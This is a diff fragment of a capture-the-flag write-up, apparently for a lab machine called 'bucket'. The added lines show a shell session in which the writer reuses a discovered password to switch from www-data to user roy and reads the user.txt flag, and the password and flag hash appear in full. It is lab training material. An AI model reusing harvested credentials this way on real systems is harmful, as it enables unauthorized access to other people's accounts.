@@ -456,6 +456,23 @@ Sysadm: n2vM-<_K_Q:.Aa2
 
 Use `su roy` and password `n2vM-<_K_Q:.Aa2` is right.
 
+We get **user.txt**
+
+```
+www-data@bucket:/$ su roy
+su roy
+Password: n2vM-<_K_Q:.Aa2
+
+roy@bucket:~$ cd ~
+cd ~
+roy@bucket:~$ ls
+ls
+project  user.txt
+roy@bucket:~$ cat user.txt
+cat user.txt
+b10f444a760afce0900d49c472fb154a
+```
+
 Also we could notice, that roy belongs to group *sysadm*
 
 ```
